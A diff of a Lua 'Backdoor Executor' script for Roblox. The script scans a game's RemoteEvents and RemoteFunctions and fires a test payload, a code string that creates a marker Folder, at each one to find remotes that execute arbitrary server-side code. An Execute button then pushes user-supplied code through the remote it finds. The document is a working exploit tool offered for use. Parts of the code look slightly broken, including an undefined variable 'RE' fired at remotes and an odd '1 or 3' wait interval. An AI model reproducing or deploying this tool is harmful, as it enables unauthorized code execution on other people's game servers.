@@ -16,106 +16,195 @@ local function coreNotify(title, text)
         })
 end
 
-coreNotify("Backdoor Executor", "Scanning for backdoors...")
+local SAFE_LOCATIONS = {
+		CoreGui = true,
+		ServerStorage = true,
+		ReplicatedFirst = true,
+		ServerScriptService = true,
+	}
 
-local lugares = {
-    game:GetService("Workspace"),
-    game:GetService("Lighting"),
-    game:GetService("ReplicatedStorage"),
-    game:GetService("StarterGui"),
-    game:GetService("StarterPlayer"),
-    game:GetService("StarterPack"),
-    game:GetService("Players"),
-    game:GetService("Teams"),
-    game:GetService("Chat"),
-    game:GetService("SoundService"),
-    game:GetService("CoreGui")
-}
+	local EXCLUDED_REMOTES = {
+		DefaultChatSystemChatEvents = true,
+		ChatSystemRunner = true,
+		ReplicatedStats = true,
+		CharacterStats = true,
+		PlayerList = true,
+		Badges = true,
+		Leaderboard = true,
+		Teams = true,
+	}
 
-local function randomName(len)
-    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-    local s = ""
-    for i = 1, len do
-        local r = math.random(1, #chars)
-        s ..= chars:sub(r, r)
-    end
-    return s
+	local foundExploit = false
+	local remoteEvent, remoteFunction
+	local scanTime = 0
+	local timeToFindExploit = 0 
+
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local StarterGui = game:GetService("StarterGui")
+
+	local function isLikelyBackdoorRemote(remote)
+		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
+		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
+			return false
+		end
+
+		if EXCLUDED_REMOTES[remote.Name] then return false end
+
+		return true
+	end
+
+	local activeTests = {}
+	local function setupGlobalDescendantListener()
+		ReplicatedStorage.DescendantAdded:Connect(function(inst)
+			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "BackdoorExecutor_" then
+				local testId = inst.Name
+				if activeTests[testId] then
+					activeTests[testId].found = true
+				end
+			end
+		end)
+	end
+	setupGlobalDescendantListener()
+
+	local function testRemote(remote, isFunction)
+
+		if foundExploit then return false end
+
+
+		local testId = "BackdoorExecutor_" .. tostring(os.clock()):gsub("[^%d]", "")
+		local payload = string.format([[
+				local m = Instance.new("Folder")
+				m.Name = "%s"
+				m.Parent = game:GetService("ReplicatedStorage")
+			]], testId)
+
+		activeTests[testId] = {
+			remote = remote,
+			isFunction = isFunction,
+			found = false
+		}
+
+		pcall(function()
+			if isFunction then
+				task.spawn(function() 
+					pcall(function() remote:InvokeServer(payload) end)
+					pcall(function() remote:InvokeServer(RE) end)
+				end)
+			else
+				pcall(function() remote:FireServer(payload) end)
+				pcall(function() remote:FireServer(RE) end)
+			end
+		end)
+
+		return testId
+	end
+
+	local function simpleFindRemote()
+		foundExploit = false
+		remoteEvent, remoteFunction = nil, nil
+		timeToFindExploit = 0 
+		local candidates = {}
+		local initialScanStart = os.clock()
+
+		for _, obj in ipairs(game:GetDescendants()) do
+			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
+				if isLikelyBackdoorRemote(obj) then
+					table.insert(candidates, obj)
+				end
+			end
+		end
+
+		local testStartTime = os.clock() 
+		local activeTestIds = {}
+		if #candidates > 0 then
+			for _, remote in ipairs(candidates) do
+				if foundExploit then break end
+				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
+				if testId then
+					table.insert(activeTestIds, testId)
+				end
+			end
+
+			local timeoutDuration = 1
+			local checkInterval = 1 or 3
+			local elapsed = 0
+
+			while elapsed < timeoutDuration do
+				task.wait(checkInterval)
+				elapsed += checkInterval
+
+				for i = #activeTestIds, 1, -1 do
+					local testId = activeTestIds[i]
+					local testData = activeTests[testId]
+
+					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
+						testData.found = true
+						foundExploit = true
+						if testData.isFunction then
+							remoteFunction = testData.remote
+						else
+							remoteEvent = testData.remote
+						end
+						print("Backdoor found:", testData.remote:GetFullName())
+						timeToFindExploit = os.clock() - initialScanStart
+						activeTests[testId] = nil
+						table.remove(activeTestIds, i)
+						local f = ReplicatedStorage:FindFirstChild(testId)
+						if f then f:Destroy() end
+						break
+					end
+				end
+				if foundExploit then break end
+			end
+		end
+
+		scanTime = os.clock() - initialScanStart
+		if not foundExploit then
+		else
+		end
+
+		for testId, testData in pairs(activeTests) do
+			local f = ReplicatedStorage:FindFirstChild(testId)
+			if f then f:Destroy() end
+			activeTests[testId] = nil
+		end
+	end
+		StarterGui:SetCore("SendNotification", {
+			Title = "Backdoor Executor",
+			Text = "Scanning...",
+			Duration = 3,
+		})
+		task.spawn(function()
+			local scanStart = os.clock() 
+			simpleFindRemote()
+			local scanEnd = os.clock()
+            
+			if foundExploit then
+				StarterGui:SetCore("SendNotification", {
+					Title = "Backdoor Executor",
+					Text = "Backdoor found in " .. string.format("%.2f", timeToFindExploit) .. " s",
+					Duration = 5,
+				})
+			else
+				StarterGui:SetCore("SendNotification", {
+					Title = "Backdoor Executor",
+					Text = "No backdoor found",
+					Duration = 5,
+				})
+			end
+		end)
+		
+local function RunPayload(code)
+	if remoteEvent then
+		remoteEvent:FireServer(code)
+	elseif remoteFunction then
+		remoteFunction:InvokeServer(code)
+	end
 end
 
-local function buildTestCode(modelName)
-    return ([[local m = Instance.new("Model")
-m.Name = "%s"
-m.Parent = workspace]]):format(modelName)
-end
-
-local function testRemote(remote)
-    for i = 1, 100 do
-        local name = "BD_CHECK_" .. randomName(6)
-        local code = buildTestCode(name)
-
-        pcall(function()
-            if remote:IsA("RemoteEvent") then
-                remote:FireServer(code)
-            else
-                remote:InvokeServer(code)
-            end
-        end)
-
-      local found = false
-
-for _ = 1, 20 do
-    local obj = workspace:FindFirstChild(name)
-    if obj then
-        obj:Destroy()
-        found = true
-        break
-    end
-    task.wait(0.1)
-end
-
-if found then
-    return true
-end
-    end
-    return false
-end
-
-local function findValidRemoteEarly()
-    for _, base in ipairs(lugares) do
-        for _, obj in ipairs(base:GetDescendants()) do
-            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
-                if testRemote(obj) then
-                    return obj
-                end
-            end
-        end
-    end
-    return nil
-end
-
-local validRemote
-local finished = false
-
-task.spawn(function()
-    validRemote = findValidRemoteEarly()
-    finished = true
-end)
-
-local start = tick()
-while not finished and tick() - start < 6 do
-    task.wait(0.1)
-end
-
-if not validRemote then
-    coreNotify("Backdoor Executor", "Game not backdoored")
-    return
-end
-
-getgenv().validRemote = validRemote
-
-coreNotify("Backdoor Executor", "Backdoor found!")
-
-local Players = game:GetService("Players")
+task.wait(1)
+if foundExploit then
+	local Players = game:GetService("Players")
 
 
 
@@ -1036,25 +1125,20 @@ ExecuteButton.MouseButton1Click:Connect(function()
         return
     end
 
-    local r = getgenv().validRemote
-    if not r then
+    if not foundExploit then
+        coreNotify("Error", "No backdoor found")
+        logToConsole("ERROR", "No backdoor found", Color3.fromRGB(255, 100, 100))
         return
     end
 
-    local ok, err = pcall(function()
-        if r:IsA("RemoteEvent") then
-            r:FireServer(code)
-        else
-            r:InvokeServer(code)
-        end
+    pcall(function()
+        RunPayload(code)
     end)
 
-    if ok then
-        coreNotify("Success", "Script Executed")
-        logToConsole("SUCCESS", "Script Executed", Color3.fromRGB(100, 255, 100))
-    else
-    end
+    coreNotify("Success", "Script Executed")
+    logToConsole("SUCCESS", "Script Executed", Color3.fromRGB(100, 255, 100))
 end)
+
 
 
 
@@ -2096,4 +2180,5 @@ for _, obj in ipairs(ScreenGui:GetDescendants()) do
     if obj:IsA("ScrollingFrame") then
         obj.ScrollBarThickness = 0
     end
+end
 end
